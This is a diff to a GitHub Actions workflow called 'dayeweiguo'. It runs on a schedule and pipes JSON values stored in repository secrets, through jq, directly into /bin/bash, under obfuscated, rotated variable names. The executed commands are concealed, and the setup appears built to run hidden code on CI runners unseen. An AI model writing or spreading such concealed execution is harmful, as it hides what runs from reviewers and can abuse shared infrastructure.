@@ -1,8 +1,9 @@
 name: dayeweiguo
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 1/6 * * *'
+    - cron: '41 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +11,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: dayeweiguo
         env:
-          alnu513: ${{ secrets.alnu513 }}
+          btzn15719: ${{ secrets.btzn15719 }}
         run: |
-          echo $alnu513 | jq -r .oo9819 | /bin/bash
-          echo $cn1272 | jq -r .swif44 | /bin/bash
-          echo $jpcfv98 | jq -r .cf33556 | /bin/bash
-          echo $h9520 | jq -r .x5885 | /bin/bash
-          echo $mvtx8908 | jq -r .n852 | /bin/bash
-          echo $qiwsl7500 | jq -r .rtiw29044 | /bin/bash
-          echo $fo4 | jq -r .ms65839 | /bin/bash
+          echo $btzn15719 | jq -r .slbuk56 | /bin/bash
+          echo $p33768 | jq -r .mg5593 | /bin/bash
+          echo $tbipq45888 | jq -r .hbv926 | /bin/bash
+          echo $mnkr5044 | jq -r .fc83557 | /bin/bash
+          echo $r2119 | jq -r .mi47757 | /bin/bash
+          echo $ti9131 | jq -r .jxkfi73 | /bin/bash
+          echo $lrsvy1896 | jq -r .ptae5293 | /bin/bash
+          echo $r702 | jq -r .r6304 | /bin/bash
+          echo $e8 | jq -r .z874 | /bin/bash
+          echo $r965 | jq -r .id418 | /bin/bash
+          echo $vkw35547 | jq -r .gopsq24 | /bin/bash
+          echo $k669 | jq -r .oh334 | /bin/bash
+          echo $xd76 | jq -r .ioleo1929 | /bin/bash
+          echo $mks1 | jq -r .kqez41 | /bin/bash
+          echo $e6 | jq -r .v965 | /bin/bash
 
